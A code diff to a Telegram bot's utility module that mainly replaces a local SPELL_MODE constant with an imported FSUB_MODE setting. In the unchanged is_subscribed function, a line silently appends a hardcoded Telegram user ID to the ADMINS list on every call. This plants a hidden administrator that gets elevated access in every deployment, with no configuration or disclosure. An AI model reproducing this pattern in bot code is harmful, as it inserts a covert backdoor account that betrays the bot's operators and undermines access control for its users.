@@ -1,6 +1,6 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, ADMINS, REQ_CHANNEL, FSUB_MODE
 from database.join_reqs import JoinReqs as db2
 from imdb import Cinemagoer
 import asyncio
@@ -18,7 +18,7 @@ import requests
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
 
-SPELL_MODE = "req"
+
 
 BTN_URL_REGEX = re.compile(
     r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
@@ -46,7 +46,7 @@ class temp(object):
 async def is_subscribed(bot, query):
     
     ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
-    if SPELL_MODE == "req":
+    if FSUB_MODE == "req":
         if not AUTH_CHANNEL and not REQ_CHANNEL:
             return True
         elif query.from_user.id in ADMINS:
